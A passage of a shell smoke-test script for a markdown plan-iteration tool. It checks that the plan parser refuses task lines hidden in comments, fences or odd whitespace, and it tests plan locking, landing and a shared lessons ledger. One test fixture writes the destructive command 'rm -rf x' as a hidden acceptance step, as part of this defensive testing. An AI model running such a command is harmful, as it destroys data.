  "div":       (D + "<div>\n```\n" + EX + "```\n</div>\n\n" + T, None),
  "comment1":  (D + "<!-- note -->\n\n" + T, None),
  "comment2":  (D + "<!--\n" + EX + "-->\n\n" + T, None),
  "pre":       (D + "<pre>\n" + EX + "</pre>\n\n" + T, None),
  "indentdiv": (D + "  <div>\n\n```\n" + EX + "```\n\n" + T, None),
  "fence1":    (D + " ```\n" + EX + " ```\n\n" + T, None),
  "fence4":    (D + "    ```\n" + EX + "    ```\n\n" + T, None),
  "fenceblk":  (T + "  ```\n  example\n  ```\n", None),
  "blkcomment":("- [ ] **Phase 1.1** real\n  - <!--\n  - Acceptance: rm -rf x\n  -->\n", None),
  "blkcol0":   ("- [ ] **Phase 1.1** real\n# heading\n    - Acceptance: make real\n", None),
  "nbspclose": (D + "```\n" + EX + "``` \n\n" + T, None),
  "cr":        (D + "text\r- [ ] **Phase 9.9** hidden\n\n" + T, None),
  "nested":    (D + "- note\n    - [ ] x\n\n" + T, None),
  "dash2":     (D + "- - [ ] x\n\n" + T, None),
  "ordered":   (D + "1. [ ] x\n\n" + T, None),
  "innerfence":(D + "````\n```\n" + EX + "````\n\n" + T, None),
  "tabclose":  (D + "```\n" + EX + "\t```\n```\n\n" + T, None),
  "front":     ("---\ntitle: x\n---\n\n" + T, None),
  "math":      (D + "$$\nx\n$$\n\n" + T, None),
  "admon":     (D + ":::note\nx\n:::\n\n" + T, None),
  "emptymark": (D + "-\n  [ ] **Phase 2** hidden task\n\n" + T, None),
  "emptystar": (D + "*\n    [ ] t\n\n" + T, None),
  "emptyord":  (D + "1.\n   [ ] t\n\n" + T, None),
  "emptyx":    (D + "-\n  [x] t\n\n" + T, None),
  "hrthen":    (D + "***\n*\n  [ ] t\n\n" + T, None),
  "setext":    ("- [ ] **Phase 1.1** Ship it\n  ===\n  - Acceptance: true\n", None),
  "bom":       ("\ufeff" + T, None),
  "vt-before": (D + "- \v[ ] **Phase 2** vt\n\n" + T, None),
  "ff-after":  (D + "- [ ]\f**Phase 2** ff\n\n" + T, None),
  "nbsp":      (D + "- \u00a0[ ] **Phase 2** nbsp\n\n" + T, None),
  "ideosp":    (D + "-\n  \u3000[ ] **Phase 2** ideographic\n\n" + T, None),
  "emsp":      (D + "-\u2003[x] t\n\n" + T, None),
  "entity":    (D + "- &#91; ] t\n\n" + T, None),
  "escaped":   (D + "- \\[ ] t\n\n" + T, None),
  "h4-listcomment": ("- <!--\n" + T, None),
  "h5-quotecomment": ("> <!--\n" + T, None),
  "h1-midhidden":  ("Notes for reviewers <div hidden>\n\n" + T, None),
  "h2-midtextarea":("Example plan below <textarea>\n\n" + T, None),
  "autolink":      ("See <https://example.com>\n\n" + T, None),
  "ent-hexcap":    (D + "- &#X5B; ] t\n\n" + T, None),
  "ent-inside":    (D + "- [&#32;] t\n\n" + T, None),
  "ent-nbsp":      (D + "- [&nbsp;] t\n\n" + T, None),
  "ent-close":     (D + "- [ &#93; t\n\n" + T, None),
  # controls: these validate and run Phase 1.1
  "codespan":    (D + "Use `<repo-root>` and ``<div>`` in code spans.\n\n" + T, "Phase 1.1"),
  "lessthan":    (D + "Keep p50 < 150 ms and 3 <= n.\n\n" + T, "Phase 1.1"),
  "quoted":    (D + "> ```\n> - [ ] **Phase 9** quoted example\n> ```\n\n" + T, "Phase 1.1"),
  "fenceok":   (D + "```\nmake real\n```\n\n" + T, "Phase 1.1"),
  "longfence": (D + "````md\nexample text\n````\n\n" + T, "Phase 1.1"),
  "midcomment":(D + "text <!-- inline\n\n" + T, None),
  "listfence": (D + "- ```\n  note\n\n" + T, "Phase 1.1"),
}
bad = []
for name, (text, want) in cases.items():
    p = os.path.join(tmp, f"dialect-{name}.md")
    open(p, "w", newline="").write(text)
    v = subprocess.run([sys.executable, pl, "validate", p], capture_output=True, text=True)
    n = json.loads(subprocess.run([sys.executable, pl, "next", p], capture_output=True, text=True).stdout)
    if want is None:
        if v.returncode == 0 or n["status"] != "ERROR":
            bad.append(f"{name}: expected refusal, validate rc={v.returncode} next={n['status']}")
    else:
        got = (n.get("task") or {}).get("id")
        if v.returncode != 0 or n["status"] != "READY" or got != want:
            bad.append(f"{name}: expected READY {want}, validate rc={v.returncode} {v.stdout.strip()[:120]} next={n['status']} {got}")
for b in bad:
    print("dialect:", b, file=sys.stderr)
sys.exit(1 if bad else 0)
PY
# The shipped templates and examples stay inside the dialect.
for t in "$EX/../resources/examples/sample-plan.md" "$EX/../resources/templates/dev-plan.md" "$PLUGIN_ROOT/skills/apex-plan/resources/templates/plan-template.md"; do
  python3 "$PL" validate "$t" >/dev/null 2>&1 || fail "shipped template no longer validates: $t"
done
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 9** example\n```\n' >"$SMOKE_TMP/rem.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with a fenced task line"; fi
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```\n- [ ] **Phase 1.2** b\n' >"$SMOKE_TMP/rem2.md"
if python3 "$PL" remaining "$SMOKE_TMP/rem2.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with an unclosed fence"; fi
printf -- '- [ ] **Phase 1.1** caf\351 latin-1\n  - Acceptance: true\n' >"$SMOKE_TMP/latin1.md"
[ "$(python3 "$PL" counts "$SMOKE_TMP/latin1.md")" = "1 0" ] || fail "planlib could not count a Latin-1 plan"
ok "planlib: tags, directives, Blocked-by, next-unblocked, lanes, validation; nothing hidden, ambiguity refused"

# 26. iterate.sh: ACTIVE lock (a second plan is BUSY), STAGE and directive fields
#     in the brief, ROUTE: none without apex-dispatch, BLOCKED when nothing is ready.
K="$SMOKE_TMP/lockrepo"; mkdir -p "$K/plans"; git init -q -b main "$K"
# A valid copy of the check-25 plan (its Phase 1.5 names an unknown gate on purpose).
sed '/Phase 1.5/,$d' "$P25" >"$K/plans/a-plan.md"; cp "$K/plans/a-plan.md" "$K/plans/b-plan.md"; git -C "$K" add -A; git -C "$K" commit -qm k
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/a-plan.md >/dev/null 2>&1 && APEX_GIBSON=0 "$EX/init.sh" plans/b-plan.md >/dev/null 2>&1 ) || fail "init for the lock test failed"
OUT_A="$(brief "$K" plans/a-plan.md)"
for want in "^STATUS: READY" "^STAGE: BUILD" "^ROUTE_DIRECTIVE: class=tests" "^PATHS: tests/a/\*\*" "^BUDGET: usd=2" "^LANES: " "^ROUTE: none"; do
  has "$want" "$OUT_A" || fail "iterate brief lacks $want"
done
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a second plan was not BUSY while the first holds the ACTIVE lock"
has '^STATUS: READY' "$(brief "$K" plans/a-plan.md)" || fail "the lock owner could not re-acquire"
has '^STATUS: READY' "$(APEX_FORCE_UNLOCK=1 brief "$K" plans/b-plan.md)" || fail "APEX_FORCE_UNLOCK did not reclaim the lock"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$K/plans/c-plan.md"
( cd "$K" && APEX_GIBSON=0 "$EX/init.sh" plans/c-plan.md >/dev/null 2>&1 ) || fail "init c-plan failed"
# Everything blocked needs a cycle or an unknown reference: both make the plan
# invalid, and an invalid plan is never iterated.
C_OUT="$(APEX_FORCE_UNLOCK=1 brief "$K" plans/c-plan.md)"
has '^PLAN_ERROR: Blocked-by cycle' "$C_OUT" && has '^STATUS: ERROR plan is invalid' "$C_OUT" \
  || fail "a cyclic plan was not refused as invalid"
for p in a b; do has '^__RC__: 0$' "$(brief "$K" plans/$p-plan.md)" || fail "iterate.sh exited non-zero for plans/$p-plan.md"; done
LOCKD="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && printf '%s' "$STATE_BASE")/ACTIVE"
rm -rf "$LOCKD"; mkdir -p "$LOCKD"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "a lock dir without owner.json was treated as free"
for i in 1 2 3 4 5 6 7 8 9 10; do
  rm -rf "$LOCKD"
  ( brief "$K" plans/a-plan.md >"$SMOKE_TMP/ra" & brief "$K" plans/b-plan.md >"$SMOKE_TMP/rb" & wait )
  n="$(cat "$SMOKE_TMP/ra" "$SMOKE_TMP/rb" | grep -c '^STATUS: READY' || true)"
  [ "$n" = 1 ] || fail "lock race $i: $n plans got STATUS: READY"
done
rm -rf "$LOCKD"; mkdir -p "$LOCKD"; echo null >"$LOCKD/owner.json"
has '^STATUS: BUSY' "$(brief "$K" plans/b-plan.md)" || fail "an owner.json of null was treated as free"
rm -rf "$LOCKD"; brief "$K" plans/a-plan.md >/dev/null
B_ID="$(cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/b-plan.md && printf '%s' "$PLAN_HASH")"
( cd "$K" && source "$EX/_lib.sh" && apex_resolve plans/a-plan.md && apex_lock_stage "$B_ID" DONE )
grep -q '"stage": "BUILD"' "$LOCKD/owner.json" || fail "a non-owner changed the lock's stage"
rm -rf "$LOCKD"; mkdir -p "$LOCKD.lockdir-test"; LOCKF="$(dirname "$LOCKD")/.active.lock"; rm -f "$LOCKF"; mkdir "$LOCKF"
has '^STATUS: ERROR the ACTIVE lock could not be' "$(brief "$K" plans/a-plan.md)" || fail "an unusable lock file was reported as BUSY"
rmdir "$LOCKF" "$LOCKD.lockdir-test"
# Session-scoped (spec §5.3 D): the same plan from another session is BUSY.
rm -rf "$LOCKD"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not take the lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID=sessB brief "$K" plans/a-plan.md)" || fail "a second session took over the same plan's lock"
has '^STATUS: READY' "$(CLAUDE_CODE_SESSION_ID=sessA brief "$K" plans/a-plan.md)" || fail "session A could not re-acquire its own lock"
has '^STATUS: BUSY' "$(CLAUDE_CODE_SESSION_ID= brief "$K" plans/a-plan.md)" || fail "a caller without a session id took over a session's lock"
ok "iterate: ACTIVE lock (atomic, fail-closed, owner- and session-checked), brief fields, ROUTE: none, invalid plans refused"

# 27. land.sh handles a plan path that git quotes (spaces).
Q="$SMOKE_TMP/quoted repo"; mkdir -p "$Q/my plans"; git init -q -b main "$Q"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$Q/my plans/q-plan.md"; git -C "$Q" add -A; git -C "$Q" commit -qm q
( cd "$Q" && APEX_GIBSON=0 "$EX/init.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "init with a spaced plan path failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$Q/my plans/q-plan.md" && rm -f "$Q/my plans/q-plan.md.bak"
( cd "$Q" && APEX_GIBSON=0 "$EX/land.sh" "my plans/q-plan.md" >/dev/null 2>&1 ) || fail "land.sh refused a plan path containing spaces"
# A rename into the ledger path, or an APEX_LESSONS_FILE pointing at a source
# file, never lets an unrelated change ride along.
G="$SMOKE_TMP/g27"; mkdir -p "$G/plans" "$G/src"; git init -q -b main "$G"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$G/plans/g-plan.md"; echo s >"$G/src/secret.txt"; echo a >"$G/src/app.py"
git -C "$G" add -A; git -C "$G" commit -qm g
( cd "$G" && APEX_GIBSON=0 "$EX/init.sh" plans/g-plan.md >/dev/null 2>&1 ) || fail "init g27 failed"
sed -i.bak 's/^- \[ \]/- [x]/' "$G/plans/g-plan.md" && rm -f "$G/plans/g-plan.md.bak"
mkdir -p "$G/.claude/apex-scope-loop"; git -C "$G" mv src/secret.txt .claude/apex-scope-loop/LESSONS.md
expect_refusal "rename into the ledger" "unrelated to this plan" indir "$G" APEX_GIBSON=0 "$EX/land.sh" plans/g-plan.md
git -C "$G" mv .claude/apex-scope-loop/LESSONS.md src/secret.txt; echo edit >>"$G/src/app.py"
expect_refusal "APEX_LESSONS_FILE exemption" "unrelated to this plan" indir "$G" APEX_GIBSON=0 APEX_LESSONS_FILE="$G/src/app.py" "$EX/land.sh" plans/g-plan.md
# land.sh and iterate.sh share one definition of done and one validity gate:
# a plan iterate refuses (here a duplicate id, which parses cleanly) never
# lands, --force included, and land says so itself.
FE="$SMOKE_TMP/fenced"; mkdir -p "$FE/plans"; git init -q -b main "$FE"
printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"; git -C "$FE" add -A; git -C "$FE" commit -qm f
( cd "$FE" && APEX_GIBSON=0 "$EX/init.sh" plans/f-plan.md >/dev/null 2>&1 ) || fail "init for the invalid-plan land test failed"
printf -- '- [x] **Phase 1.1** [docs] x\n  - Acceptance: true\n- [x] **Phase 1.1** [docs] duplicate id\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"
has '^STATUS: ERROR plan is invalid' "$(brief "$FE" plans/f-plan.md)" || fail "iterate did not refuse the duplicate-id plan"
expect_refusal "land an invalid plan" "refusing to land" indir "$FE" APEX_GIBSON=0 "$EX/land.sh" plans/f-plan.md --force
ok "land.sh: quoted plan paths; no exemption by rename or APEX_LESSONS_FILE; done means what iterate means"

# 28. One lessons ledger per repository: base caller, worktree caller and a
#     bare repo's worktrees all read and write the same file.
LP="$R/.claude/plans/demo-plan.md"
( cd "$R" && "$EX/lessons.sh" .claude/plans/demo-plan.md add "smoke lesson" w r f smoketag >/dev/null ) || fail "lessons add from the base checkout failed"
has '^LESSONS: 1 ' "$(cd "$WTP" && "$EX/lessons.sh" "$WTP/.claude/plans/demo-plan.md" recall smoketag)" || fail "the plan worktree does not see the base checkout's lesson"
BR="$SMOKE_TMP/bare.git"; git init -q --bare -b main "$BR"
git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" -b w1 2>/dev/null || git -C "$BR" worktree add -q "$SMOKE_TMP/bw1" --orphan w1
mkdir -p "$SMOKE_TMP/bw1/plans"; cp "$P25" "$SMOKE_TMP/bw1/plans/x-plan.md"; git -C "$SMOKE_TMP/bw1" add -A; git -C "$SMOKE_TMP/bw1" commit -qm x
git -C "$BR" worktree add -q "$SMOKE_TMP/bw2" -b w2 w1
L1="$(cd "$SMOKE_TMP/bw1" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
L2="$(cd "$SMOKE_TMP/bw2" && source "$EX/_lib.sh" && apex_resolve plans/x-plan.md && printf '%s' "$LESSONS_LEDGER")"
[ -n "$L1" ] && [ "$L1" = "$L2" ] || fail "bare-repo worktrees use different lesson ledgers: $L1 vs $L2"
ok "one lessons ledger per repository"

echo ""
echo "smoke passed: 28/28 checks"
